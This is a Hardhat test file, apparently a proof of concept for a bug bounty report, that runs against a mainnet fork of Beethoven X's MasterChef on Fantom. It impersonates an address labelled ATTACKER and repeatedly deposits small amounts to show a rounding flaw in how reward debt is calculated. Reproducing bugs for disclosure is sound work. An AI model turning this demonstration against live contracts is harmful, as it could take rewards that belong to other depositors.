import { expect } from 'chai'
import { advanceBlock, advanceBlockTo, bn, deployContract, getLatestBlock, setAutomineBlocks } from './utilities'
import { ethers } from 'hardhat'
import { impersonateAccount } from '@nomicfoundation/hardhat-network-helpers'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { BeethovenxMasterChef, IERC20, TokenRetriever } from '../types'

const MASTERCHEF = '0x8166994d9ebBe5829EC86Bd81258149B87faCfd3'
const BEETS = '0xF24Bcf4d1e507740041C9cFd2DddB29585aDCe1e'

const ATTACKER = '0x4C3490dF15edFa178333445ce568EC6D99b5d71c'
const LPTOKEN = '0x7005Fec9F7e07a60289539B1856807273fF114Ac'
const POOLID = 133

// run fork
// yarn hardhat node --fork https://rpc.ftm.tools/ --fork-block-number 70695979 --no-deploy
// run test
// yarn hardhat test .\test\BeethovenxMasterChef.test.ts --grep "BeethovenxMasterChef multiple deposits into pool that once had emissions"

// rounding issue how rewarddebt is calculated

describe('Masterchef immunefi report', function () {
    let owner: SignerWithAddress

    before(async function () {
        const signers = await ethers.getSigners()
        owner = signers[0]
    })

    it('test forking', async () => {
        const masterchef = (await ethers.getContractAt('BeethovenxMasterChef', MASTERCHEF)) as BeethovenxMasterChef
        const poolInfo = await masterchef.poolInfo(POOLID)
        console.log(`alloc point: ${poolInfo.allocPoint.toString()}`)
    })

    it('test deposit', async () => {
        await impersonateAccount(ATTACKER)
        const attacker = await ethers.getSigner(ATTACKER)
        const lp = (await ethers.getContractAt('IERC20', LPTOKEN)) as IERC20

        const chef = (await ethers.getContractAt('BeethovenxMasterChef', MASTERCHEF)) as BeethovenxMasterChef

        const poolInfo = await chef.poolInfo(POOLID)
        console.log(`allocPoint: ${poolInfo.allocPoint.toString()}`)
        console.log(`lastRewardBlock: ${poolInfo.lastRewardBlock.toString()}`)
        console.log(`accBeetsPerShare: ${poolInfo.accBeetsPerShare.toString()}`)
        console.log((await getLatestBlock()).number)

        await lp.connect(attacker).approve(chef.address, ethers.constants.MaxUint256)
        let bobPendingBeets = await chef.pendingBeets(POOLID, attacker.address)
        let bobUserInfo = await chef.userInfo(POOLID, attacker.address)

        console.log(`bob amount before: ${bobUserInfo.amount.toString()}`)
        console.log(`bob rewardDebt before: ${bobUserInfo.rewardDebt.toString()}`)
        console.log(`bob pending rewards before: ${bobPendingBeets.toString()}`)
        expect(bobPendingBeets).to.be.equal(0)

        for (let i = 0; i < 5; i++) {
            await advanceBlockTo((await ethers.provider.getBlockNumber()) + 100)
            await chef.connect(attacker).deposit(POOLID, 10000, attacker.address)
            await chef.updatePool(POOLID)
            const poolInfo = await chef.poolInfo(POOLID)
            bobPendingBeets = await chef.pendingBeets(POOLID, attacker.address)
            bobUserInfo = await chef.userInfo(POOLID, attacker.address)
            console.log(`bob amount after ${i}: ${bobUserInfo.amount.toString()}`)
            console.log(`bob rewardDebt after ${i}: ${bobUserInfo.rewardDebt.toString()}`)
            console.log(`bob pending rewards after ${i}: ${bobPendingBeets.toString()}`)
            console.log(`accBeetsPerShare: ${poolInfo.accBeetsPerShare.toString()}`)
            console.log(`---------------------------------------------`)
        }
        // await advanceBlock()
        // await chef.connect(attacker).deposit(POOLID, 10, attacker.address)
        // await chef.updatePool(POOLID)
        // bobPendingBeets = await chef.pendingBeets(POOLID, attacker.address)
        // bobUserInfo = await chef.userInfo(POOLID, attacker.address)
        // console.log(`bob amount after: ${bobUserInfo.amount.toString()}`)
        // console.log(`bob rewardDebt after: ${bobUserInfo.rewardDebt.toString()}`)
        // console.log(`bob pending rewards after: ${bobPendingBeets.toString()}`)
    })
})
